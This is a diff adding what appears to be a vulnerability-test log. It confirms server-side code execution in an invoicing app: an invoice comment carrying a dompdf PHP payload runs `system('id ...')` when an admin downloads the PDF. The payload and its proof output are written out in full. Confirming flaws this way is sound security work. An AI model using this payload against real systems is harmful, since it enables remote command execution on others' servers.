@@ -1,0 +1,12 @@
+========================================================================
+VULN-001: Stored invoice comment -> dompdf enable_php -> server-side RCE
+target: http://localhost:20000
+[INFO] exercising vulnerable code path: InvoiceService::download() feeds stored Comment bodies raw into a PHP-enabled dompdf render
+========================================================================
+[SETUP] secretary sec_rce_2099405b@example.invalid stored an invoice comment on invoice 4 whose body is a dompdf PHP payload: <script type="text/php"> system('id > /tmp/pwn_2099405b') </script>
+[INFO] marker /tmp/pwn_2099405b before trigger: <absent>
+[STEP] as ADMIN, GET /admin/invoices/4 then invoke the download_pdf action
+[INFO] download_pdf action HTTP 200 (download effect: yes)
+[PROOF] the marker file now contains the output of `id` executed by the server: "uid=0(root) gid=0(root) groups=0(root)" — arbitrary OS command execution as the web-server user, triggered by the admin PDF download
+[OK] exploit confirmed — stored invoice comment achieved server-side RCE via dompdf
+==> VULN-001: CONFIRMED — secretary-stored invoice comment executes as PHP during admin PDF render -> RCE
